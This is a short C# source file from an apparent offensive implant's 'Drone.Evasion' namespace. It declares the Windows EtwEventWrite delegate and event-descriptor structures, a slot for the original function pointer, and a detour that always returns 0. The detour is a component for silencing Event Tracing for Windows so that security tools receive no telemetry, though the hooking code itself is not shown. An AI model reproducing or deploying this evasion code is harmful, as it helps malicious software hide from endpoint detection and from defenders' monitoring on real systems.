using System;
using System.Runtime.InteropServices;

namespace Drone.Evasion
{
    public static class Etw
    {
        public static EtwEventWriteDelegate EtwEventWriteOriginal { get; set; }

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
        public delegate ulong EtwEventWriteDelegate(
            IntPtr RegHandle,
            EVENT_DESCRIPTOR EventDescriptor,
            ulong UserDataCount,
            EVENT_DATA_DESCRIPTOR UserData);

        [StructLayout(LayoutKind.Sequential)]
        public struct EVENT_DESCRIPTOR
        {
            public ushort Id;
            public byte Version;
            public byte Channel;
            public byte Level;
            public byte Opcode;
            public ushort Task;
            public ulong Keyword;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EVENT_DATA_DESCRIPTOR
        {
            ulong Ptr;
            ulong Size;
            ulong Reserved;
        }

        public static ulong EtwEventWriteDetour(IntPtr RegHandle, EVENT_DESCRIPTOR EventDescriptor, ulong UserDataCount, EVENT_DATA_DESCRIPTOR UserData)
        {
            return 0;
        }
    }
}